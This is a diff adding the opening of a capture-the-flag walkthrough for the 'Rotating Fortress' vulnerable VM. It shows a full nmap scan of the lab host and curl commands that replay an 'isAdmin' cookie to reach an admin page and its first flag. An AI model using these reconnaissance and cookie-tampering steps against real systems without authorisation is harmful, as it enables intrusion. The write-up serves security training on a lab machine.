@@ -1,0 +1,112 @@
+https://hackso.me/rotating-fortress-1.0.1-walkthrough/
+
+
+Description
+
+Difficulty: Intermediate/Hard
+
+Rotating Fortress has been serveral months in the making and has a unique feature that sets it apart from other vms ;)
+
+Zeus the admin of the server is retiring from Project: Rotating Fortress, but he doesn't want the project to die with his retirment. To find the successor to the project he has created a challenge. Will you be able to get in, rotate the fortress, escape isolation and reach root?
+
+Your Goal is to get root and read /flag.txt
+
+Note: This isn't a short VM and may take several hours to complete.
+
+
+└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.13
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 15:32 CEST
+Nmap scan report for 192.168.110.13
+Host is up (0.00041s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+27025/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, GenericLines, SSLSessionReq: 
+|     Connection establised 
+|     Requesting Challenge Hash...
+|   DNSVersionBindReqTCP, HTTPOptions, NULL, RPCCheck, RTSPRequest, TLSSessionReq, TerminalServerCookie: 
+|     Connection establised 
+|     Requesting Challenge Hash... 
+|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database]
+|   GetRequest: 
+|     Connection establised 
+|     Connection Closed: Access Denied [Challenge Hash Did Not Return Any Results From Database] 
+|_    Requesting Challenge Hash...
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port27025-TCP:V=7.91%I=7%D=4/13%Time=60759D69%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,91,"Connection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.
+SF:\.\.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20H
+SF:ash\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20
+SF:\n")%r(GenericLines,35,"Connection\x20establised\x20\nRequesting\x20Cha
+SF:llenge\x20Hash\.\.\.\x20\n")%r(GetRequest,91,"Connection\x20establised\
+SF:x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x
+SF:20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\nReq
+SF:uesting\x20Challenge\x20Hash\.\.\.\x20\n")%r(HTTPOptions,91,"Connection
+SF:\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nConnecti
+SF:on\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\
+SF:x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n")%r(RTSPRequest
+SF:,91,"Connection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\
+SF:.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash
+SF:\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n"
+SF:)%r(RPCCheck,91,"Connection\x20establised\x20\nRequesting\x20Challenge\
+SF:x20Hash\.\.\.\x20\nConnection\x20Closed:\x20Access\x20Denied\x20\[Chall
+SF:enge\x20Hash\x20Did\x20Not\x20Return\x20Any\x20Results\x20From\x20Datab
+SF:ase\]\x20\n")%r(DNSVersionBindReqTCP,91,"Connection\x20establised\x20\n
+SF:Requesting\x20Challenge\x20Hash\.\.\.\x20\nConnection\x20Closed:\x20Acc
+SF:ess\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\x20Return\x20Any\x20
+SF:Results\x20From\x20Database\]\x20\n")%r(DNSStatusRequestTCP,35,"Connect
+SF:ion\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\n")%r(
+SF:SSLSessionReq,35,"Connection\x20establised\x20\nRequesting\x20Challenge
+SF:\x20Hash\.\.\.\x20\n")%r(TerminalServerCookie,91,"Connection\x20establi
+SF:sed\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nConnection\x20Close
+SF:d:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x20Not\x20Return\x
+SF:20Any\x20Results\x20From\x20Database\]\x20\n")%r(TLSSessionReq,91,"Conn
+SF:ection\x20establised\x20\nRequesting\x20Challenge\x20Hash\.\.\.\x20\nCo
+SF:nnection\x20Closed:\x20Access\x20Denied\x20\[Challenge\x20Hash\x20Did\x
+SF:20Not\x20Return\x20Any\x20Results\x20From\x20Database\]\x20\n");
+MAC Address: 08:00:27:CC:11:0A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.41 ms 192.168.110.13
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 154.00 seconds
+                                                                
+
+└─$ curl -c cookie http://192.168.110.13/Janus.php
+<html>
+<title>
+Janus
+</title>
+<body>
+    You're not the Admin!
+</body>
+</html>
+
+└─$ cat cookie
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+192.168.110.13  FALSE   /       FALSE   0       isAdmin 1
+ └─$ curl -b cookie http://192.168.110.13/Janus.php
+<html>
+<title>
+Janus
+</title>
+<body>
+    Welcome Back Admin Last edited file was: /LELv3FfpLrbX1S4Q2FHA1hRtIoQa38xF8dzc8O9z/home.html Flag: 1{7daLI]} ggez
+</body>
+</html>
+      
